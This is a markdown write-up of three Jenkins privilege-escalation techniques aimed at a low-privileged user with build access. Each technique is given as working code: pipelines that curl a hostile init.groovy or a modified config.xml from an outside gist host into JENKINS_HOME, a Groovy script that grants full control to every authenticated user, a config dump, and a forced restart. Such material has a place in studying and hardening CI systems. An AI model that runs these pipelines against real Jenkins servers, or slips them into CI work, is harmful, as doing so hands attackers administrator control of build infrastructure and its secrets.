# Privilege Escalations

- The Marix-based security/ Project-based Matrix Authorization Strategy is used to define authorization and scopes.
- In our privilege escalation techniques we will try to escalate our privileges to an adminstrator.




## Give admin access to all authenticated users by executing a groovy script - Technique 1

- The 1st condition for this attack is that the build has to run on the Built-In node , i.e on the Controller.
- The 2nd condition is Jenkins would need a restart after this attack.
- We need to write a init.groovy script that will give the authenticated users admin access 
- We will write a pipeline script to download that init.grooy script that will be replaced in the JENKINS_HOME location.
- init.groovy script will run after the Jenkins initialization, hence a Jenkins reboot is required.
- We will wait for a restart and our low privileged user will have admin access.

init.groovy
``` Groovy
//code copied from http://tdongsi.github.io/blog/2017/12/30/groovy-hook-script-and-jenkins-configuration-as-code/
import jenkins.model.*
def instance = Jenkins.getInstance()

import hudson.security.*
def realm = new HudsonPrivateSecurityRealm(false)
instance.setSecurityRealm(realm)

def strategy = new hudson.security.FullControlOnceLoggedInAuthorizationStrategy()
strategy.setAllowAnonymousRead(false)
instance.setAuthorizationStrategy(strategy)

instance.save()
```

pipeline
``` Jenkinsfile
pipeline {
    agent any
    stages {
        stage('Copy Groovy Script to JENKINS_HOME') {
            steps {
                sh '''
                    curl -o /var/lib/jenkins/init.groovy https://gist.githubusercontent.com/dibsy/c42f536d12a406cbd3845aea4f6ac746/raw/476980613a3f23af11bc958f8a03fc40689987ff/HOOK.groovy
                  '''
            }
        }         
    }
}
```


## Escalate to adminstrator role through groovy init scripts - Technique 2 ( Restart using Pipeline )

- In the previous example we were dependant on the Jenkins restart by admin. 
- It is possible to initiate Jenkins restart by Jenkins Pipeline and in order to do so we need a script approval from admin.
- The 1st condition for this attack is that the build has to run on the Built-In node , i.e on the Controller.
- The 2nd condition is we need to run this pipeline without sandbox mode ( Uncheck in Project Configuration ```Use Groovy Sandbox``` )
- The 3rd condition is admins need to approve this scripts.

To carry out the attack
- We need to write a init.groovy script that will give the authenticated users admin access 
- We will write a pipeline script to download that init.grooy script that will be replaced in the JENKINS_HOME location.
- init.groovy script will run after the Jenkins initialization, hence a Jenkins reboot is required.
- We will write another stage to Restart the Jenkins and start the job.
- Admin need to approve the scripts.
- We need to rerun the attack after the script approval and we will gain admin access after the restart.

init.groovy
``` Groovy
//code copied from http://tdongsi.github.io/blog/2017/12/30/groovy-hook-script-and-jenkins-configuration-as-code/
import jenkins.model.*
def instance = Jenkins.getInstance()

import hudson.security.*
def realm = new HudsonPrivateSecurityRealm(false)
instance.setSecurityRealm(realm)

def strategy = new hudson.security.FullControlOnceLoggedInAuthorizationStrategy()
strategy.setAllowAnonymousRead(false)
instance.setAuthorizationStrategy(strategy)

instance.save()
```

pipeline
```
pipeline {
    agent any
    
    stages {
        stage('Copy Groovy Script to JENKINS_HOME') {
            steps {
                sh '''
                    curl -o /var/lib/jenkins/init.groovy https://gist.githubusercontent.com/dibsy/c42f536d12a406cbd3845aea4f6ac746/raw/476980613a3f23af11bc958f8a03fc40689987ff/HOOK.groovy
                  '''
            }
        }
        stage('Restart Jenkins') {
            steps {
                script {
                    Jenkins.instance.restart()
                }
            }
        }        
    }
}
```



## Escalate to adminstrator role by modifying the config.xml file

- The 1st condition for this attack is that the build has to run on the Built-In node , i.e on the Controller.
- The 2nd condition is that either we need a restart or a reload of configuration data from disk.
- We will dump the config.xml
- We will modify the config.xml to add builduser as admin ``` <permission>USER:hudson.model.Hudson.Administer:builduser</permission> ```
- Next we will run a pipeline that will download and replace the config.xml with the modified xml
- From the next restart or reloading of config data, our changes will take effect.

```
pipeline{
    agent any
    stages{
        stage("Dump config.xml file"){
            steps{
                sh '''
                    cat /var/lib/jenkins/config.xml
                '''
            }
        }
        stage("Replace the modified config.xml file"){
            steps{
                sh '''
                    curl -o /var/lib/jenkins/config.xml https://gist.githubusercontent.com/dibsy/1548ae721e687cc86b9d4a95cc3bafa5/raw/2a3693b17c638f27f1be56af62d85de0309144cb/configModified.xml
                '''
            }
        }        
    }
}
```
